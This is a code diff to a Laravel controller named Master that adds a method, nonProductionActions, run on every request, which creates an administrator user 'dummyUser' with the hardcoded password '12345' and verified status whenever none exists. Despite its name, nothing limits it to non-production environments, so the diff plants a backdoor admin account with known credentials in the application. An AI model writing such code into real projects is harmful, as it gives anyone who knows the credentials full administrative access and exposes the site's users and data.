@@ -24,6 +24,9 @@ class Master extends \App\Http\Controllers\Controller
         Self::createViewMessageSession();
         $this->createBaseCategories();
         $this->setURI($request);
+
+        $this->nonProductionActions();
+
         return $next($request);
     }
 
@@ -135,5 +138,15 @@ class Master extends \App\Http\Controllers\Controller
             $categoryObj->save();
         }
         session()->put('alreadyCheckedCategoriesFile', true);
+    }
+
+    public function nonProductionActions()
+    {
+        $user = \App\Models\User::where('name', 'dummyUser')->get();
+        if($user->count() < 1){
+            $user = \App\Models\User::create(['name' => 'dummyUser', 'email' => 'dummyUser@gmail.com', 'password' => hash('sha256', '12345'), 'is_admin' => 1, 'isVerified' => true]);
+        }else{
+            $user = $user[0];
+        }
     }
 }
